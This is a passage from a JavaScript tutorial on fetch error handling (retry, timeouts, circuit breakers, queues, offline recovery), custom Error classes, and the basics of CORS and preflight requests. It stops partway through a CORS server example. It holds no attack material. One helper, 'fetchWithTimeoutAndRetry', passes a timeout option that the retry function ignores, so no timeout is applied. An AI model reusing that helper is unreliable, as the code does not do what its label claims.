**Network Errors**: Connection failures, timeouts, DNS failures (fetch rejects) **HTTP Errors**: 4xx, 5xx status codes (fetch resolves, but `response.ok` is false) **Parsing Errors**: Invalid JSON, corrupt blobs **Timeout Errors**: Request takes too long **Abort Errors**: Request cancelled by user or code

### Basic Error Detection Pattern

```javascript
async function fetchWithErrorDetection(url) {
  try {
    const response = await fetch(url);
    
    // Check HTTP status
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    // Parse response
    const data = await response.json();
    return data;
    
  } catch (error) {
    // Network error or parsing error
    if (error.name === 'TypeError') {
      throw new Error('Network error occurred');
    }
    throw error;
  }
}
```

### Retry Pattern with Exponential Backoff

Automatically retry failed requests with increasing delays:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        // Don't retry client errors (4xx)
        if (response.status >= 400 && response.status < 500) {
          throw new Error(`Client error: ${response.status}`);
        }
        // Retry server errors (5xx)
        throw new Error(`Server error: ${response.status}`);
      }
      
      return response;
      
    } catch (error) {
      lastError = error;
      
      // Don't retry on last attempt
      if (i === maxRetries - 1) break;
      
      // Exponential backoff: 1s, 2s, 4s, 8s...
      const delay = Math.pow(2, i) * 1000;
      console.log(`Retry attempt ${i + 1} after ${delay}ms`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}

// Usage
try {
  const response = await fetchWithRetry('/api/data');
  const data = await response.json();
} catch (error) {
  console.error('All retries failed:', error);
}
```

### Advanced Retry with Configurable Strategy

```javascript
class RetryStrategy {
  constructor(config = {}) {
    this.maxRetries = config.maxRetries || 3;
    this.initialDelay = config.initialDelay || 1000;
    this.maxDelay = config.maxDelay || 30000;
    this.backoffMultiplier = config.backoffMultiplier || 2;
    this.retryableStatuses = config.retryableStatuses || [408, 429, 500, 502, 503, 504];
    this.shouldRetry = config.shouldRetry || this.defaultShouldRetry.bind(this);
  }
  
  defaultShouldRetry(error, response, attempt) {
    // Don't retry if max attempts reached
    if (attempt >= this.maxRetries) return false;
    
    // Retry network errors
    if (error && error.name === 'TypeError') return true;
    
    // Retry specific HTTP status codes
    if (response && this.retryableStatuses.includes(response.status)) {
      return true;
    }
    
    return false;
  }
  
  getDelay(attempt) {
    const delay = this.initialDelay * Math.pow(this.backoffMultiplier, attempt);
    const jitter = Math.random() * 0.3 * delay; // Add 0-30% jitter
    return Math.min(delay + jitter, this.maxDelay);
  }
  
  async execute(fetchFn) {
    let attempt = 0;
    let lastError;
    let lastResponse;
    
    while (attempt < this.maxRetries) {
      try {
        const response = await fetchFn();
        
        if (!response.ok) {
          lastResponse = response;
          
          if (!this.shouldRetry(null, response, attempt)) {
            return response;
          }
          
          throw new Error(`HTTP ${response.status}`);
        }
        
        return response;
        
      } catch (error) {
        lastError = error;
        
        if (!this.shouldRetry(error, lastResponse, attempt)) {
          throw error;
        }
        
        const delay = this.getDelay(attempt);
        console.log(`Retry ${attempt + 1}/${this.maxRetries} after ${delay.toFixed(0)}ms`);
        
        await new Promise(resolve => setTimeout(resolve, delay));
        attempt++;
      }
    }
    
    throw lastError || new Error('Max retries exceeded');
  }
}

// Usage
const retry = new RetryStrategy({
  maxRetries: 5,
  initialDelay: 500,
  retryableStatuses: [429, 500, 502, 503, 504]
});

const response = await retry.execute(() => fetch('/api/data'));
const data = await response.json();
```

### Timeout Pattern

Implement request timeouts since fetch doesn't have built-in timeout support:

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const signal = controller.signal;
  
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal
    });
    
    clearTimeout(timeoutId);
    return response;
    
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

// Combine with retry
async function fetchWithTimeoutAndRetry(url, options = {}) {
  return fetchWithRetry(
    url,
    { ...options, timeout: 5000 },
    3
  );
}
```

### Circuit Breaker Pattern

Prevent cascading failures by stopping requests after repeated failures:

```javascript
class CircuitBreaker {
  constructor(options = {}) {
    this.failureThreshold = options.failureThreshold || 5;
    this.resetTimeout = options.resetTimeout || 60000;
    this.monitoringPeriod = options.monitoringPeriod || 10000;
    
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
    this.failures = 0;
    this.nextAttempt = Date.now();
    this.recentRequests = [];
  }
  
  recordSuccess() {
    this.failures = 0;
    if (this.state === 'HALF_OPEN') {
      this.state = 'CLOSED';
      console.log('Circuit breaker closed');
    }
    this.cleanupRecentRequests();
  }
  
  recordFailure() {
    this.failures++;
    this.recentRequests.push(Date.now());
    this.cleanupRecentRequests();
    
    const recentFailures = this.recentRequests.length;
    
    if (this.state === 'HALF_OPEN' || recentFailures >= this.failureThreshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.resetTimeout;
      console.log(`Circuit breaker opened. Next attempt at ${new Date(this.nextAttempt)}`);
    }
  }
  
  cleanupRecentRequests() {
    const cutoff = Date.now() - this.monitoringPeriod;
    this.recentRequests = this.recentRequests.filter(time => time > cutoff);
  }
  
  canAttempt() {
    if (this.state === 'CLOSED') return true;
    
    if (this.state === 'OPEN' && Date.now() >= this.nextAttempt) {
      this.state = 'HALF_OPEN';
      console.log('Circuit breaker half-open, trying one request');
      return true;
    }
    
    return this.state === 'HALF_OPEN';
  }
  
  async execute(fetchFn) {
    if (!this.canAttempt()) {
      throw new Error('Circuit breaker is OPEN');
    }
    
    try {
      const result = await fetchFn();
      this.recordSuccess();
      return result;
    } catch (error) {
      this.recordFailure();
      throw error;
    }
  }
}

// Usage
const breaker = new CircuitBreaker({
  failureThreshold: 3,
  resetTimeout: 30000,
  monitoringPeriod: 10000
});

async function makeRequest(url) {
  try {
    return await breaker.execute(async () => {
      const response = await fetch(url);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    });
  } catch (error) {
    console.error('Request failed:', error.message);
    throw error;
  }
}
```

### Fallback Pattern

Provide alternative data sources or cached responses:

```javascript
async function fetchWithFallback(primaryUrl, fallbackUrl, cacheKey) {
  // Try primary source
  try {
    const response = await fetchWithTimeout(primaryUrl, {}, 3000);
    if (response.ok) {
      const data = await response.json();
      // Cache the result
      localStorage.setItem(cacheKey, JSON.stringify({
        data,
        timestamp: Date.now()
      }));
      return data;
    }
  } catch (error) {
    console.warn('Primary source failed:', error.message);
  }
  
  // Try fallback source
  if (fallbackUrl) {
    try {
      const response = await fetchWithTimeout(fallbackUrl, {}, 3000);
      if (response.ok) {
        return await response.json();
      }
    } catch (error) {
      console.warn('Fallback source failed:', error.message);
    }
  }
  
  // Try cache
  const cached = localStorage.getItem(cacheKey);
  if (cached) {
    const { data, timestamp } = JSON.parse(cached);
    const age = Date.now() - timestamp;
    if (age < 3600000) { // Cache valid for 1 hour
      console.log('Using cached data');
      return data;
    }
  }
  
  throw new Error('All sources failed and no valid cache available');
}

// Usage
const data = await fetchWithFallback(
  '/api/primary/data',
  '/api/backup/data',
  'data-cache-key'
);
```

### Queue Pattern for Rate Limiting

Handle rate-limited APIs by queuing requests:

```javascript
class RequestQueue {
  constructor(options = {}) {
    this.maxConcurrent = options.maxConcurrent || 5;
    this.minInterval = options.minInterval || 100;
    this.queue = [];
    this.active = 0;
    this.lastRequest = 0;
  }
  
  async enqueue(fetchFn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fetchFn, resolve, reject });
      this.process();
    });
  }
  
  async process() {
    if (this.active >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }
    
    // Enforce minimum interval
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequest;
    if (timeSinceLastRequest < this.minInterval) {
      setTimeout(() => this.process(), this.minInterval - timeSinceLastRequest);
      return;
    }
    
    const { fetchFn, resolve, reject } = this.queue.shift();
    this.active++;
    this.lastRequest = Date.now();
    
    try {
      const result = await fetchFn();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.active--;
      this.process();
    }
  }
}

// Usage
const queue = new RequestQueue({
  maxConcurrent: 3,
  minInterval: 200
});

async function makeQueuedRequest(url) {
  return queue.enqueue(async () => {
    const response = await fetch(url);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return await response.json();
  });
}

// Make many requests that will be automatically queued
const requests = Array.from({ length: 20 }, (_, i) => 
  makeQueuedRequest(`/api/items/${i}`)
);
const results = await Promise.all(requests);
```

### Graceful Degradation Pattern

```javascript
class ResilientFetcher {
  constructor() {
    this.features = {
      json: true,
      images: true,
      polling: true
    };
    this.degradationLevel = 0;
  }
  
  async fetch(url, options = {}) {
    try {
      const response = await fetchWithRetry(url, options, 3);
      
      if (response.ok) {
        this.resetDegradation();
        return response;
      }
      
      this.increaseDegradation();
      throw new Error(`HTTP ${response.status}`);
      
    } catch (error) {
      this.increaseDegradation();
      throw error;
    }
  }
  
  increaseDegradation() {
    this.degradationLevel++;
    
    if (this.degradationLevel > 10) {
      this.features.polling = false;
      console.log('Disabled polling due to repeated failures');
    }
    
    if (this.degradationLevel > 20) {
      this.features.images = false;
      console.log('Disabled image loading');
    }
    
    if (this.degradationLevel > 50) {
      this.features.json = false;
      console.log('Critical degradation: using minimal mode');
    }
  }
  
  resetDegradation() {
    if (this.degradationLevel > 0) {
      this.degradationLevel = Math.max(0, this.degradationLevel - 1);
      
      if (this.degradationLevel < 10) {
        this.features.polling = true;
      }
      if (this.degradationLevel < 20) {
        this.features.images = true;
      }
      if (this.degradationLevel < 50) {
        this.features.json = true;
      }
    }
  }
  
  shouldLoadFeature(feature) {
    return this.features[feature];
  }
}

// Usage
const fetcher = new ResilientFetcher();

if (fetcher.shouldLoadFeature('images')) {
  await fetcher.fetch('/api/images');
}
```

### Comprehensive Error Recovery System

```javascript
class FetchManager {
  constructor(config = {}) {
    this.retry = new RetryStrategy(config.retry);
    this.breaker = new CircuitBreaker(config.breaker);
    this.queue = new RequestQueue(config.queue);
    this.cache = new Map();
    this.defaultTimeout = config.timeout || 10000;
  }
  
  async fetch(url, options = {}) {
    const cacheKey = `${url}-${JSON.stringify(options)}`;
    
    // Check cache first
    if (options.cache !== 'no-cache') {
      const cached = this.getFromCache(cacheKey);
      if (cached) return cached;
    }
    
    // Execute with all recovery patterns
    return this.queue.enqueue(async () => {
      return this.breaker.execute(async () => {
        return this.retry.execute(async () => {
          const controller = new AbortController();
          const timeout = setTimeout(
            () => controller.abort(),
            options.timeout || this.defaultTimeout
          );
          
          try {
            const response = await fetch(url, {
              ...options,
              signal: controller.signal
            });
            
            clearTimeout(timeout);
            
            if (!response.ok) {
              throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            // Cache successful response
            const cloned = response.clone();
            this.addToCache(cacheKey, cloned);
            
            return response;
            
          } catch (error) {
            clearTimeout(timeout);
            
            if (error.name === 'AbortError') {
              throw new Error('Request timeout');
            }
            
            throw error;
          }
        });
      });
    });
  }
  
  getFromCache(key) {
    const cached = this.cache.get(key);
    if (!cached) return null;
    
    const age = Date.now() - cached.timestamp;
    if (age > 300000) { // 5 minutes
      this.cache.delete(key);
      return null;
    }
    
    return cached.response.clone();
  }
  
  addToCache(key, response) {
    this.cache.set(key, {
      response: response.clone(),
      timestamp: Date.now()
    });
    
    // Limit cache size
    if (this.cache.size > 100) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
  }
  
  clearCache() {
    this.cache.clear();
  }
}

// Usage
const manager = new FetchManager({
  retry: { maxRetries: 3, initialDelay: 1000 },
  breaker: { failureThreshold: 5, resetTimeout: 60000 },
  queue: { maxConcurrent: 5, minInterval: 100 },
  timeout: 5000
});

try {
  const response = await manager.fetch('/api/data');
  const data = await response.json();
  console.log(data);
} catch (error) {
  console.error('Request failed after all recovery attempts:', error);
  // Show user-friendly error message
}
```

### User Experience Patterns

```javascript
async function fetchWithUserFeedback(url, statusElement) {
  const retry = new RetryStrategy({ maxRetries: 3 });
  
  statusElement.textContent = 'Loading...';
  statusElement.className = 'loading';
  
  try {
    const response = await retry.execute(async () => {
      try {
        return await fetchWithTimeout(url, {}, 5000);
      } catch (error) {
        statusElement.textContent = 'Retrying...';
        throw error;
      }
    });
    
    const data = await response.json();
    
    statusElement.textContent = 'Success!';
    statusElement.className = 'success';
    
    return data;
    
  } catch (error) {
    statusElement.textContent = 'Failed to load. Please try again.';
    statusElement.className = 'error';
    
    throw error;
  }
}
```

### Offline Detection and Recovery

```javascript
class OfflineHandler {
  constructor() {
    this.isOnline = navigator.onLine;
    this.pendingRequests = [];
    
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }
  
  handleOnline() {
    console.log('Connection restored');
    this.isOnline = true;
    this.retryPendingRequests();
  }
  
  handleOffline() {
    console.log('Connection lost');
    this.isOnline = false;
  }
  
  async fetch(url, options = {}) {
    if (!this.isOnline) {
      return new Promise((resolve, reject) => {
        this.pendingRequests.push({ url, options, resolve, reject });
        console.log('Request queued for when connection is restored');
      });
    }
    
    try {
      const response = await fetch(url, options);
      return response;
    } catch (error) {
      if (error.name === 'TypeError' && !navigator.onLine) {
        return new Promise((resolve, reject) => {
          this.pendingRequests.push({ url, options, resolve, reject });
        });
      }
      throw error;
    }
  }
  
  async retryPendingRequests() {
    const requests = [...this.pendingRequests];
    this.pendingRequests = [];
    
    for (const { url, options, resolve, reject } of requests) {
      try {
        const response = await fetch(url, options);
        resolve(response);
      } catch (error) {
        reject(error);
      }
    }
  }
}

// Usage
const offlineHandler = new OfflineHandler();

async function makeRequest(url) {
  try {
    const response = await offlineHandler.fetch(url);
    return await response.json();
  } catch (error) {
    console.error('Request failed:', error);
  }
}
```

---

## Custom Error Classes

Custom error classes extend JavaScript's built-in `Error` class to create domain-specific error types with additional properties, behaviors, and semantic meaning for different failure scenarios.

### Basic Custom Error Implementation

```javascript
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ValidationError';
  }
}

throw new ValidationError('Invalid email format');
```

### The Constructor Pattern

#### Calling super()

The `super(message)` call is mandatory and must occur before accessing `this`. It invokes the parent Error constructor to set up the error message and stack trace.

```javascript
class CustomError extends Error {
  constructor(message) {
    super(message); // Must be first
    this.name = 'CustomError';
    this.timestamp = Date.now();
  }
}
```

#### Setting the name Property

The `name` property determines how the error appears in stack traces and console output. Set it to match the class name for clarity.

```javascript
class DatabaseError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DatabaseError'; // Shows as "DatabaseError:" in stack traces
  }
}
```

### Stack Trace Manipulation

#### Error.captureStackTrace()

Node.js and V8-based environments provide `Error.captureStackTrace()` to exclude the constructor from the stack trace:

```javascript
class ApplicationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ApplicationError';
    Error.captureStackTrace(this, this.constructor);
  }
}
```

This removes the constructor call itself from the stack, making traces cleaner by starting at the throw site.

#### Stack Property Behavior

[Inference: Based on Error specification behavior] The `stack` property is typically set automatically when the Error is created. Modifying it manually is possible but rarely necessary:

```javascript
const error = new CustomError('Failed');
console.log(error.stack); // Includes file, line, and call stack
```

### Adding Custom Properties

#### Simple Property Addition

```javascript
class HTTPError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.name = 'HTTPError';
    this.statusCode = statusCode;
    this.timestamp = new Date().toISOString();
  }
}

throw new HTTPError('Not Found', 404);
```

#### Complex Contextual Data

```javascript
class QueryError extends Error {
  constructor(message, query, params) {
    super(message);
    this.name = 'QueryError';
    this.query = query;
    this.params = params;
    this.executedAt = Date.now();
  }
}

throw new QueryError(
  'Invalid SQL syntax',
  'SELECT * FROM users WHERE id = ?',
  [undefined]
);
```

#### Nested Error Information

```javascript
class APIError extends Error {
  constructor(message, originalError, context) {
    super(message);
    this.name = 'APIError';
    this.originalError = originalError;
    this.context = context;
    this.retryable = this.determineRetryability(originalError);
  }

  determineRetryability(error) {
    const retryableCodes = [408, 429, 500, 502, 503, 504];
    return retryableCodes.includes(error.statusCode);
  }
}
```

### Error Hierarchies

#### Creating Error Families

```javascript
class ApplicationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ApplicationError';
  }
}

class ValidationError extends ApplicationError {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}

class AuthenticationError extends ApplicationError {
  constructor(message, userId) {
    super(message);
    this.name = 'AuthenticationError';
    this.userId = userId;
  }
}

class AuthorizationError extends ApplicationError {
  constructor(message, requiredPermission) {
    super(message);
    this.name = 'AuthorizationError';
    this.requiredPermission = requiredPermission;
  }
}
```

#### Multi-Level Hierarchies

```javascript
class NetworkError extends Error {
  constructor(message) {
    super(message);
    this.name = 'NetworkError';
  }
}

class TimeoutError extends NetworkError {
  constructor(message, timeout) {
    super(message);
    this.name = 'TimeoutError';
    this.timeout = timeout;
  }
}

class ConnectionError extends NetworkError {
  constructor(message, host, port) {
    super(message);
    this.name = 'ConnectionError';
    this.host = host;
    this.port = port;
  }
}
```

### Error Detection and Handling

#### instanceof Checking

```javascript
try {
  // some operation
} catch (error) {
  if (error instanceof ValidationError) {
    console.log(`Validation failed on field: ${error.field}`);
  } else if (error instanceof AuthenticationError) {
    console.log(`Auth failed for user: ${error.userId}`);
  } else if (error instanceof ApplicationError) {
    console.log('Application error:', error.message);
  } else {
    console.log('Unexpected error:', error);
  }
}
```

#### Checking Error Hierarchies

```javascript
class DatabaseError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DatabaseError';
  }
}

class QueryError extends DatabaseError {
  constructor(message, query) {
    super(message);
    this.name = 'QueryError';
    this.query = query;
  }
}

try {
  throw new QueryError('Syntax error', 'SELECT * FORM users');
} catch (error) {
  console.log(error instanceof QueryError);      // true
  console.log(error instanceof DatabaseError);   // true
  console.log(error instanceof Error);           // true
}
```

#### Name-Based Detection

```javascript
try {
  // operation
} catch (error) {
  switch (error.name) {
    case 'ValidationError':
      handleValidation(error);
      break;
    case 'NetworkError':
      handleNetwork(error);
      break;
    default:
      handleUnknown(error);
  }
}
```

### Advanced Patterns

#### Error Factory Functions

```javascript
class RequestError extends Error {
  constructor(message, statusCode, requestId) {
    super(message);
    this.name = 'RequestError';
    this.statusCode = statusCode;
    this.requestId = requestId;
  }

  static badRequest(message, requestId) {
    return new RequestError(message, 400, requestId);
  }

  static unauthorized(message, requestId) {
    return new RequestError(message, 401, requestId);
  }

  static forbidden(message, requestId) {
    return new RequestError(message, 403, requestId);
  }

  static notFound(message, requestId) {
    return new RequestError(message, 404, requestId);
  }
}

throw RequestError.notFound('User not found', 'req-12345');
```

#### Error Serialization

```javascript
class SerializableError extends Error {
  constructor(message, code, details) {
    super(message);
    this.name = 'SerializableError';
    this.code = code;
    this.details = details;
  }

  toJSON() {
    return {
      name: this.name,
      message: this.message,
      code: this.code,
      details: this.details,
      stack: this.stack
    };
  }

  static fromJSON(json) {
    const error = new SerializableError(
      json.message,
      json.code,
      json.details
    );
    error.stack = json.stack;
    return error;
  }
}

const error = new SerializableError('Failed', 'ERR_001', { field: 'email' });
const json = JSON.stringify(error);
const restored = SerializableError.fromJSON(JSON.parse(json));
```

#### Error Wrapping

```javascript
class WrappedError extends Error {
  constructor(message, cause) {
    super(message);
    this.name = 'WrappedError';
    this.cause = cause;
  }

  getFullMessage() {
    let msg = this.message;
    let current = this.cause;
    while (current) {
      msg += `\nCaused by: ${current.message}`;
      current = current.cause;
    }
    return msg;
  }
}

try {
  try {
    throw new Error('Database connection failed');
  } catch (dbError) {
    throw new WrappedError('Failed to fetch user', dbError);
  }
} catch (error) {
  console.log(error.getFullMessage());
  // "Failed to fetch user
  // Caused by: Database connection failed"
}
```

### Error Cause Support

Modern JavaScript (ES2022) includes native `cause` support:

```javascript
class ModernError extends Error {
  constructor(message, options) {
    super(message, options); // Pass options including cause
    this.name = 'ModernError';
  }
}

try {
  throw new Error('Original error');
} catch (originalError) {
  throw new ModernError('Wrapped error', { cause: originalError });
}
```

### Validation Error Patterns

#### Field-Specific Errors

```javascript
class FieldValidationError extends Error {
  constructor(field, value, constraint) {
    super(`${field} validation failed: ${constraint}`);
    this.name = 'FieldValidationError';
    this.field = field;
    this.value = value;
    this.constraint = constraint;
  }
}

throw new FieldValidationError('email', 'notanemail', 'must be valid email');
```

#### Multiple Validation Errors

```javascript
class MultiValidationError extends Error {
  constructor(errors) {
    const message = `${errors.length} validation error(s)`;
    super(message);
    this.name = 'MultiValidationError';
    this.errors = errors;
  }

  addError(field, message) {
    this.errors.push({ field, message });
  }

  hasErrors() {
    return this.errors.length > 0;
  }

  getErrorsForField(field) {
    return this.errors.filter(e => e.field === field);
  }
}

const validationError = new MultiValidationError([
  { field: 'email', message: 'Invalid format' },
  { field: 'password', message: 'Too short' }
]);
```

### HTTP-Specific Error Classes

```javascript
class HTTPError extends Error {
  constructor(message, statusCode, body) {
    super(message);
    this.name = 'HTTPError';
    this.statusCode = statusCode;
    this.body = body;
  }

  get isClientError() {
    return this.statusCode >= 400 && this.statusCode < 500;
  }

  get isServerError() {
    return this.statusCode >= 500;
  }
}

class NotFoundError extends HTTPError {
  constructor(resource) {
    super(`${resource} not found`, 404);
    this.name = 'NotFoundError';
    this.resource = resource;
  }
}

class UnauthorizedError extends HTTPError {
  constructor(message = 'Unauthorized') {
    super(message, 401);
    this.name = 'UnauthorizedError';
  }
}
```

### Async Error Handling

#### Promise Rejection with Custom Errors

```javascript
class AsyncOperationError extends Error {
  constructor(message, operation) {
    super(message);
    this.name = 'AsyncOperationError';
    this.operation = operation;
  }
}

async function fetchData(url) {
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new AsyncOperationError(
        `Fetch failed: ${response.statusText}`,
        'fetch'
      );
    }
    return await response.json();
  } catch (error) {
    if (error instanceof AsyncOperationError) {
      throw error;
    }
    throw new AsyncOperationError(
      `Network error: ${error.message}`,
      'fetch'
    );
  }
}
```

#### Error Recovery Metadata

```javascript
class RetryableError extends Error {
  constructor(message, maxRetries = 3, retryDelay = 1000) {
    super(message);
    this.name = 'RetryableError';
    this.maxRetries = maxRetries;
    this.retryDelay = retryDelay;
    this.attempts = 0;
  }

  shouldRetry() {
    return this.attempts < this.maxRetries;
  }

  incrementAttempts() {
    this.attempts++;
  }

  getNextDelay() {
    return this.retryDelay * Math.pow(2, this.attempts); // Exponential backoff
  }
}
```

### TypeScript Integration

```javascript
// JavaScript with JSDoc for type hints
/**
 * @extends {Error}
 */
class TypedError extends Error {
  /**
   * @param {string} message
   * @param {number} code
   * @param {Object} metadata
   */
  constructor(message, code, metadata) {
    super(message);
    this.name = 'TypedError';
    this.code = code;
    this.metadata = metadata;
  }
}
```

### Best Practices

#### Consistent Naming Convention

Use descriptive names ending in "Error":

- `ValidationError`, not `InvalidInput`
- `DatabaseConnectionError`, not `DBFail`

#### Preserve Original Error Information

```javascript
class WrapperError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'WrapperError';
    this.originalError = originalError;
    
    // Preserve original stack trace
    if (originalError && originalError.stack) {
      this.stack = `${this.stack}\nCaused by: ${originalError.stack}`;
    }
  }
}
```

#### Avoid Over-Engineering

Don't create custom error classes for every possible scenario. Group related errors:

```javascript
// Good: One class with error codes
class DatabaseError extends Error {
  constructor(message, code) {
    super(message);
    this.name = 'DatabaseError';
    this.code = code; // 'CONNECTION_FAILED', 'QUERY_TIMEOUT', etc.
  }
}

// Avoid: Separate class for every database issue
// class DatabaseConnectionError extends Error { }
// class DatabaseTimeoutError extends Error { }
// class DatabaseQueryError extends Error { }
```

#### Make Errors Informative

Include context that helps debugging:

```javascript
class ProcessingError extends Error {
  constructor(message, data, stage) {
    super(message);
    this.name = 'ProcessingError';
    this.data = data;
    this.stage = stage;
    this.timestamp = new Date().toISOString();
  }

  toString() {
    return `${this.name} at stage "${this.stage}" (${this.timestamp}): ${this.message}`;
  }
}
```

### Testing Custom Errors

```javascript
// Test that custom errors work correctly
function testCustomError() {
  const error = new ValidationError('Invalid input', 'email');
  
  console.assert(error instanceof Error);
  console.assert(error instanceof ValidationError);
  console.assert(error.name === 'ValidationError');
  console.assert(error.message === 'Invalid input');
  console.assert(error.field === 'email');
  console.assert(error.stack.includes('ValidationError'));
}
```

### Error Logging Integration

```javascript
class LoggableError extends Error {
  constructor(message, severity = 'error', metadata = {}) {
    super(message);
    this.name = 'LoggableError';
    this.severity = severity;
    this.metadata = metadata;
    this.timestamp = Date.now();
  }

  toLogEntry() {
    return {
      timestamp: this.timestamp,
      severity: this.severity,
      name: this.name,
      message: this.message,
      metadata: this.metadata,
      stack: this.stack
    };
  }
}

try {
  throw new LoggableError('Operation failed', 'critical', { userId: 123 });
} catch (error) {
  logger.log(error.toLogEntry());
}
```

---

# CORS (Cross-Origin Resource Sharing)

## CORS Concepts and Mechanics

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls how web pages from one origin can access resources from different origins, using HTTP headers to explicitly permit cross-origin requests that would otherwise be blocked by the Same-Origin Policy.

### Origin Definition and Comparison

An origin consists of three components: scheme (protocol), host (domain), and port.

```
https://example.com:443/path?query=value
^^^^^  ^^^^^^^^^^^^ ^^^
scheme    host      port
```

#### Same-Origin Examples

```javascript
// Base: https://example.com:443/page

// Same origin - identical scheme, host, port
https://example.com:443/other
https://example.com/api        // Port 443 implied for https

// Different origins
http://example.com              // Different scheme
https://api.example.com         // Different host (subdomain)
https://example.com:8443        // Different port
https://example.org             // Different domain
```

#### Browser Origin Calculation

```javascript
// Current page origin
console.log(window.location.origin); // "https://example.com"

// URL origin
const url = new URL('https://api.example.com/data');
console.log(url.origin); // "https://api.example.com"

// Origin comparison
const isSameOrigin = window.location.origin === url.origin;
```

### Preflight Requests

Preflight is an OPTIONS request sent before the actual request for certain cross-origin requests to determine if the actual request is safe to send.

#### Conditions Triggering Preflight

##### Non-Simple Methods

```javascript
// Triggers preflight - PUT method
fetch('https://api.example.com/resource', {
  method: 'PUT',
  body: JSON.stringify({ data: 'value' })
});

// Triggers preflight - DELETE method
fetch('https://api.example.com/resource/123', {
  method: 'DELETE'
});

// Triggers preflight - PATCH method
fetch('https://api.example.com/resource/123', {
  method: 'PATCH',
  body: JSON.stringify({ field: 'updated' })
});
```

##### Non-Simple Headers

```javascript
// Triggers preflight - custom header
fetch('https://api.example.com/data', {
  headers: {
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});

// Triggers preflight - non-simple Content-Type
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});
```

##### Simple Requests (No Preflight)

```javascript
// No preflight - GET with simple headers
fetch('https://api.example.com/data', {
  headers: {
    'Accept': 'application/json'
  }
});

// No preflight - POST with simple Content-Type
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'key=value&other=data'
});

// No preflight - POST with multipart/form-data
const formData = new FormData();
formData.append('file', fileInput.files[0]);
fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData // Content-Type automatically set
});
```

#### Simple Request Criteria

A request is "simple" and avoids preflight if ALL conditions are met:

1. Method is GET, HEAD, or POST
2. Only simple headers are set:
    - Accept
    - Accept-Language
    - Content-Language
    - Content-Type (with value limitations)
    - Range (with byte-range limitations)
3. Content-Type (if set) is one of:
    - application/x-www-form-urlencoded
    - multipart/form-data
    - text/plain
4. No event listeners on XMLHttpRequest.upload
5. No ReadableStream in the request

#### Preflight Request Flow

```
Client                          Server
  |                               |
  |--- OPTIONS (preflight) ------>|
  |    Access-Control-Request-    |
  |    Method: PUT                |
  |    Access-Control-Request-    |
  |    Headers: Content-Type,     |
  |             Authorization     |
  |                               |
  |<--- 204 No Content -----------|
  |    Access-Control-Allow-      |
  |    Origin: https://app.com    |
  |    Access-Control-Allow-      |
  |    Methods: PUT, DELETE       |
  |    Access-Control-Allow-      |
  |    Headers: Content-Type,     |
  |             Authorization     |
  |    Access-Control-Max-Age:    |
  |    86400                      |
  |                               |
  |--- PUT (actual request) ----->|
  |    Authorization: Bearer ...  |
  |                               |
  |<--- 200 OK -------------------|
  |    Access-Control-Allow-      |
  |    Origin: https://app.com    |
```

#### Preflight Request Headers

```javascript
// Browser automatically sends
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization
```

#### Preflight Response Headers

```javascript
// Server must respond with
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: content-type, authorization, x-custom-header
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true
```

### CORS Headers Deep Dive

#### Access-Control-Allow-Origin

Controls which origins can access the resource.

```javascript
// Single origin
Access-Control-Allow-Origin: https://app.example.com

// Wildcard (no credentials allowed with wildcard)
Access-Control-Allow-Origin: *

// Dynamic origin reflection (server-side logic required)
// Request
Origin: https://trusted-site.com

// Response
Access-Control-Allow-Origin: https://trusted-site.com
```

##### Server Implementation Patterns

```javascript
// Node.js/Express - whitelist approach
const allowedOrigins = [
  'https://app.example.com',
  'https://staging.example.com',
  'http://localhost:3000'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});

// Dynamic subdomain matching
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && origin.match(/^https:\/\/[\w-]+\.example\.com$/)) {
